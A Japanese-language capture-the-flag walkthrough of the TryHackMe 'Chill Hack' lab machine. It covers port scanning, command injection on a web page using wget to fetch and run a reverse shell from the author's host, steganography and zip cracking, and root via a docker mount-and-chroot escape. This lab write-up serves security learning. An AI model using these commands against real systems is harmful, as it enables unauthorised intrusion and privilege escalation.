# Chill Hack CTF

https://tryhackme.com/room/chillhack

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.54.62
root@ip-10-10-41-148:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-27 06:50 GMT
Nmap scan report for 10.10.54.62
Host is up (0.00022s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:EE:C0:84:A5:0B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.73 seconds
root@ip-10-10-41-148:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-27 06:50 GMT
Nmap scan report for 10.10.54.62
Host is up (0.00019s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:EE:C0:84:A5:0B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-41-148:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.54.62
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.54.62/images/]
/contact.php          (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.54.62/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.54.62/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.54.62/fonts/]
/secret               (Status: 301) [Size: 311] [--> http://10.10.54.62/secret/]
/server-status        (Status: 403) [Size: 276]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

### FTP

```shell
$ ftp 10.10.54.62
Connected to 10.10.54.62.
220 (vsFTPd 3.0.3)
Name (10.10.54.62:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||59487|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
```

```shell
$ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

### /secret

コマンド入力の画面。

pwd, whoami 等は実行されるが、cat /etc/passwd は「Are you a hacker?」と表示される。

できれば手っ取り早くリバースシェルを実行したい。

wget でリバースシェルを保存して実行できた。

```shell
wget http://10.2.22.182:8000/sec -O /tmp/sec
chmod +x /tmp/sec
/tmp/sec
```

リバースシェル取得

```shell
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.54.62] 36180
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## 権限昇格１

```shell
$ ls -al /home
total 20
drwxr-xr-x  5 root    root    4096 Oct  3  2020 .
drwxr-xr-x 24 root    root    4096 Oct  3  2020 ..
drwxr-x---  2 anurodh anurodh 4096 Oct  4  2020 anurodh
drwxr-xr-x  5 apaar   apaar   4096 Oct  4  2020 apaar
drwxr-x---  4 aurick  aurick  4096 Oct  3  2020 aurick
$ ls -al /home/apaar
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
```

local.txt は読む権限なし。

謎のシェルスクリプト

```shell
$ cat .helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

aurick が最も権限が多い。

```shell
$ id anurodh
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
$ id apaar
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
$ id aurick
uid=1000(aurick) gid=1000(aurick) groups=1000(aurick),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

hacker.php に意味深な記述を見つけた。

```shell
$ cat files/hacker.php
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

```shell
$ ls -al files/images
total 2112
drwxr-xr-x 2 root root    4096 Oct  3  2020 .
drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
-rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
```

jpg ファイルに対して Stegseek をかけると、zip が出てきた。

```shell
$ stegseek ./2.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "backup.zip".
[i] Extracting to "2.jpg.out".
```

zip にパスワードが設定されている。

```shell
$ file ./2.jpg.out
./2.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate

$ unzip ./2.jpg.out
Archive:  ./2.jpg.out
[./2.jpg.out] source_code.php password:
   skipping: source_code.php         incorrect password
```

パスワードクラック

```shell
$ zip2john ./2.jpg.out > hash.txt
ver 2.0 efh 5455 efh 7875 2.jpg.out/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8

$ cat ./hash.txt
2.jpg.out/source_code.php:$pkzip$1*1*2*0*22a*4bb*69dc82f3*0*49*8*22a*2297*8e9e8de3a4b82cc98077a470ef800ed60ec6e205dc091547387432378de4c26ae8d64051a19d86bff2247f62dc1224ee79f048927d372bc6a45c0f21753a7b6beecfa0c847126d88084e57ddb9c90e9b0ef8018845c7d82b97b438a0a76e9a39c4846a146ae06efe4027f733ab63b509a56e2dec4c1dbce84337f0816421790246c983540c6fab21dd43aeda16d91addc5845dd18a05352ca9f4fcb45f0135be428c84dbac5a8d0c1fb2e84a7151ec3c1ae9740a84f2979d79da2e20d4854ef4483356cd078099725b5e7cf475144b22c64464a85edb8984cf7fc41d6a177f172c65e57f064700b6d49ef8298d83f42145e69befeab92453bd5f89bf827cd7993c9497eb2ad9868abd34b7a7b85f8e67404e2085de966e1460ad0ea031f895c7da70edbe7b7d6641dcdf6a4a31abc8781292a57b047a1cc5ce5ab4f375acf9a2ff4cac0075aa49e92f2d22e779bf3d9eacd2e1beffef894bc67de7235db962c80bbd3e3b54a14512a47841140e162184ca5d5d0ba013c1eaaa3220d82a53959a3e7d94fb5fa3ef3dfc049bdbd186851a1e7a8f344772155e569a5fa12659f482f4591198178600bb1290324b669d645dbb40dad2e52bf2adc2a55483837a5fc847f5ff0298fd47b139ce2d87915d688f09d8d167470db22bda770ce1602d6d2681b3973c5aac3b03258900d9e2cc50b8cea614d81bcfbb05d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip$:source_code.php:2.jpg.out::./2.jpg.out

> hashcat -m 17200 hash.txt rockyou.txt

d510638816743d125a0dce3459c29c996a5fdc66476f1b4280ac3f4f28ed1dbff48ef9f24fc028acc1393d07233d0181a6e3*$/pkzip$:pass1word
```

pass1word と判明。PHP ファイルを展開。

```php
$ cat ./source_code.php
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit">
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                {
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>
```

このパスワードを使って SSH ログインできた。

## 権限昇格２

### sudo

```shell
anurodh@ubuntu:~$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

apaar として .helpline.sh を実行できる。

再掲

```sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

person でコマンドインジェクションを狙えばよいと思われる。

```shell
anurodh@ubuntu:~$ sudo -u apaar /home/apaar/.helpline.sh
```

何やってもインジェクションできなかった。

### docker

```shell
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

docker グループの所有ファイルなし。

```shell
anurodh@ubuntu:~$ find / -group docker -type f 2>/dev/null
```

停止コンテナが１つ。

```shell
anurodh@ubuntu:~$ docker info
Client:
 Debug Mode: false

Server:
 Containers: 1
  Running: 0
  Paused: 0
  Stopped: 1
 Images: 2
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-118-generic
 Operating System: Ubuntu 18.04.5 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 1
 Total Memory: 1.945GiB
 Name: ubuntu
 ID: 5YLG:ZCN2:AI3Q:PUES:IACB:MHA5:L5M2:4YI6:SD56:Z5E2:PGSF:VT77
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: No swap limit support
```

```shell
anurodh@ubuntu:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES
9b859d23108f        hello-world         "/hello"            4 years ago         Exited (0) 4 years ago                       quizzical_perlman
```

特に何もなかった。

GTFOBins を参照。  
https://gtfobins.github.io/gtfobins/docker/#shell

```shell
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
#
```

なんと一発で root を取れた。

```shell
# cat /home/apaar/local.txt
{USER-FLAG: e8vp........................}

# cat /root/proof.txt


                                        {ROOT-FLAG: w18g..............}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-`
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-.
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    /
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     /
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``


--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```

## 振り返り

- docker コマンドの実行権限を与えたら、一発で root を取られることを初めて知って衝撃を受けた。
- 自分は www-data の列挙で直接ステガノ画像を見つけたが、SSH トンネリングで 9001 ポートで Web サイトを表示し、SQL インジェクションでログイン、というルートもあった模様。
- .helpline.sh のコマンドインジェクションについて、脆弱性があるのは、person ではなく msg の方だった。

```shell
anurodh@ubuntu:~$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: aaa
Hello user! I am aaa,  Please enter your message: /bin/bash
whoami
apaar
```
